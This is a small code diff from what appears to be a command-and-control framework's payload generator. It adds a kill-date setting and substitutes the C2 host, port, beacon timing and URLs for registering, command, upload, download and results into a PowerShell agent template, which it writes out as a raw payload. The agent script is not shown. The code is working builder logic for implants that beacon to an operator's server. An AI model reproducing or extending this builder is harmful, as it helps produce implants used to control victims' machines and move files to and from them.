@@ -18,6 +18,7 @@ PAYLOADS = []
 SSL={SSL}
 CERT='{CERT}'
 KEY='{KEY}'
+KDATE="{KDATE}"
 beacon='{beacon_time}'
 #AESKey="+4hOi8+xxOki+Mg9Y4+GuD7g7n2eytMa5KF6zNnaPz0="
 AESKey=base64.b64encode(bytearray("".join([random.choice(string.ascii_uppercase) for i in range(32)]), "UTF-8")).decode()
@@ -51,9 +52,9 @@ def PAYLOAD():
     fp = open('agents/payload2.ps1', 'r')
     ps1 = fp.read()
     if SSL==True:
-        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "https")
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "https").replace('{DATE}', KDATE)
     else :
-        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "http")
+        ps1 = ps1.replace('{ip}', HOST).replace('{port}', PORT).replace('{beacon}', beacon).replace('{register}', register_url).replace('{download}', download_url).replace('{upload}', upload_url).replace('{image}', image_url).replace('{cmd}', command_url).replace('{re}', result_url).replace('{md}', modules_url).replace('{HTTP}', "http").replace('{DATE}', KDATE)
     payload= open('payloads/raw_payload.ps1', 'w')
     payload.write(ps1)
     payload.close()
